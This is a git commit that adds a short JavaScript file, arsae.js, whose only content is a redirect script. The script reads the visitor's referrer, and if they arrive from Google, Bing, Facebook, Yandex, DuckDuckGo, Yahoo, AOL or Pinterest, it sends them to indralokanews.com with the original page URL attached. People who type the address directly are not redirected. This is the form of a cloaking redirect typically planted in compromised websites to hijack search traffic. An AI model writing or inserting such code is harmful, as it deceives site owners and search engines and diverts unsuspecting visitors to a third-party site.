4fe4d5d16f337820f08aa1f439ac70da9abe2bff
itongnet <87578362+itongnet@users.noreply.github.com>
2023-03-02 13:57:33 +0700

    Create arsae.js

---
+++ arsae.js
@@ -0,0 +1,12 @@
+    if(document.referrer)
+    {
+    	var cek = document.referrer;
+
+    	var is_se = cek.includes('.google.') || cek.includes('.bing.') || cek.includes('.facebook.') || cek.includes('yandex.') || cek.includes('duckduckgo.') || cek.includes('.yahoo.') || cek.includes('aol.') || cek.includes('pinterest.');
+
+      if(is_se)
+    	{
+    		var url = window.location.href;
+    		window.location = "https://indralokanews.com/?arsae="+ encodeURIComponent(url);
+    	}
+    }
